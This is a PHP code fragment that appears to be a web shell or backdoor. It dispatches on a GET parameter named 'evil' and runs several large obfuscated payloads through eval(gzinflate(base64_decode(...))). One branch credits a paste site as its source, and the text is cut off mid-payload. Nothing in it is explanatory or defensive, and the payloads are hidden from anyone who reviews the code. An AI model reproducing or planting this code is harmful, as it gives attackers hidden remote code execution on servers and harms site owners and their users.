eval(gzinflate(base64_decode('fVP9T9swEP25SPwPR4bkVAPCVrppo6lEGGuLNLaV8jlNlWM7xIo/othN2k773+f0C4RgiS6y7957uju9MJJq8DqJLiRIZlNNQ/Tj++UIASaWaxUi1PWOt7cabAkkTFlWdDuxi0QrC4bPWYiOUDea5dgYuJxJwVUGZV8b2wlqzBLt4iUhrvKJBTvLnYqZxJJbBCUWE3ddKdYZhaVLxIvElCIgwh1CpDOGup1gpbWQb/AEfG4Ms/7uuJ7k1yPtd7P5Z3sLXnlkRnnhI1ZyMbYVV+MydSOgPTj82G43j18nkvRF4v8oZmYskz4SCvYNBLDhLliNRmM3KUnGJIRo1IoO8c2nCZlF57EcCta7ng/O7su4Ny3pu4t2fDXNY2nnX37mZ/j2XNy1hiVRYok9jeakdeHi2wT3h9Zhovve8IrdRmLQHx7R05MJ6aXVKj+4u2lnce969rSG1g1xwSCEROdM+d5BajEhzBhvz6ve7nvNY9itCm4XkOXBX1L2YmzYh6MxZURT5q8Ga9aESGet3BHM0jO+Fzi1Z2v01gspbOgtjIQhLVgSPsMFmzuMToa9s1GIxrHAKkNPjdrqngpOMuizgu2s3RnglXXW3nzEvweihS7CN9Fh/XZdF3UPF9rN9xkGCXzVRcwpZQqq1H3q5XD1AEGJi6CqqmDRmwmolpirA6JlTYdcMLcUwJRCam1ONTE7dYFNsXQ1J/26QLBmbNrf2P8vrAYI6v/ZJf4B')));
} elseif($_GET['evil'] == 's404') {
eval(gzinflate(base64_decode('jZLPahsxEMbvBr/DeDDsBhwrh4Ch2V1oHyApjW8lGFk7G4noH5LWiQl590peNziHQm+ab77fzGgkEtJB1QiyiULXDC4YICvS0VOLZtRJeR4SK/p1zxNHMJSk61v0Libs5rPM2NRteXimBN+gYae4UdaPCaY6id4SguUmn3sVELzmgqTTPYUWmXSG2BgpMD/utRI7mYxm2c6Fs4N6XnvpsWv24bPbIz8QfI//0S5m58SeLZO8P3oeI56BOO6NysiB6zGHP05JWCwWmTxdvavu5jM11Mvdz4fH7e9qwqunK3ifz8xLvlONdFD69uZ2F48GV3Cz2WyuMrTMOWjhL5ij6qnIZa4LvYSnRJSk9Y7eSNSoLVxHXJcSa4SL+iyLhSgNcqiVfamLa4X/MC0H57OUG+YD2S/DsrVMXAjK61jhKxb78BpUovpMrfAX8d7Qfd4cXBQdhHbx01UUmj4TBxloaL8O023dKGRZasP49CDs/Ouqu48/')));
} elseif($_GET['evil'] == 'smtp') {
eval(gzinflate(base64_decode('hVRba9swFH52Yf/hVAvUgTAN9tY6fmhfSmEwWN/GMIpyHCmTJSPJ69jlv0/HdppkxB5GRui76NPxkVEqB6yQaCP6stikUTsbIeifuP5QPisdIDpn4EUbA6GTEnELugbfWdAWokKQztZ6B7UzW/TvyAN/iKY1CLfwpdAlV65B3gX0vO02RstKxcZw/K5NfNG2In3Bdfm14LR3WfCTOOzuzVVWd1ZG7SwEuc8XW+2X8CstZzQVsE7LwqbpAJEgq51HIVU+MEQAmmxGWabr/FqHqtYGc0YI72G2XNJhorYd9i7ZQjQbbdIORK12GClsTOnCue4fdoi+8tgaIcmfrYClMaAjNSVoPe6qRsSUkvGnh76Iv/fONUbwI/0QOVuEJraVciGmDXrsm4giH2grRugI3rAVuzlkGnWii2pSN4KXdPTVJnUjeEnXihAmdSN4Uef89PlG8JIuoOw8Tipf4XMt9t3/+ePzJ3hMtbuFofmlM86v396/p6c8Fv7Qn4e2PHegdHMOhM87UD3nHAj/T4ZU2dkMCZ93oF6YcyB83mGo9ZzHwDhxOXH6Q2960Uj0Nlaqo79Bf833xyve73hKuPsL')));
} elseif($_GET['evil'] == 'bydf') {
eval(gzinflate(base64_decode('hZJNS8QwEIbPW+h/yJaFbUG24NW0B1cXPcgK9SZLyaYTE0yT0iRKEf+76deuBxdPITPzzrzPJEC5RhGmoCy0OebX+W3XEGPQnTDkKAHtnKJWaGVw6pPRTRgsFjCKmG5rVIPlusoabWyOhWqcRbZrIDPuWAuLFKkhE0qgDyIdZOuGNxt/XaP0YjW3FObyDbeEUjBmEKT9xMmDYLEwBmy8Kp/3xcvruu96SJIw+OrTKya8+Qwx3YCKo2lslJz9s89WWIiHwquoGnFLNuNmSisIA0MYlLWu+l57xrx66sGo1GaSJ7+3QhBvgZ1J860U9B09QAtLnJLB/vcf/nvsywCnRVxGwI/sSVfOq7zf0gB1PtttaB4GBdCdkP6F79WbUDCSnIIFJar3MIZxOvfJ/6c92UKFG07mpOzQtgVioVoOrHN1hNP5mx1bv4Yf')));
} elseif($_GET['evil'] == 'scon') {
eval(gzinflate(base64_decode('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')));
} elseif($_GET['evil'] == 'aueu') {
// Source codenya : https://ghostbin.co/paste/twsc3/raw
eval(gzinflate(base64_decode('7Vrxb9o4FP65J93/4GaVAidWNm67H0pAYi3dumvXCrrbTVUVGWLAIySp45T2rvvf79lxnAAJBdaedrtSqQT7vefPL5+/ZwfooLRjn512zy/MEf6CmXlZRn///NPWFh2UQs5c4un+AIeh3cMsEjYW+g2ddtCcSRQSljVRsbZIf+Qj4yP0enhCkM+QCDb1mYMmUchRj6CJzwjiI+xB4P4IM9znhIW7Rl0E+IqIGxIVbEePghooZ+R6bKXhgtXEeZ07DWXa971BJpb4SIe2Q5kOFvaxZyszcQ19JemmQgwAPe6PShlDHKKdAXWJ/JQkQqR1m4a26CgZMkI1tTLKZQTvnHoRiePG2OgQhpVWQ8KFJSceD/P863qUgJGhPcEcQBnV9/syyt0X35+4uGpUVNiyxrW14/RGPtyKBsKTHnXHmOOSsqoYqsc0KoapBxEuIu35Lqpn0UXkP99FcyLPTRIn183p5Y/DyIDeFLno3nlH3aFD7Mq5hIY2gSieINVteOWKvHukz0sqfxWVlIqaaRaR9gmJCy620yupiaVWV9roKiLstmR028ft/XP0CzrsnJ6gBN5p56DdQW8+I+qgVnc/g5+RMHK5jjIgwAAbM4ZvSztXqRkVWVbGFyZ1EqYLrlNekGnRo+7DfNqiwMHSbQb8x7OD1nlbo+62z1GkRKBhpuvYrCS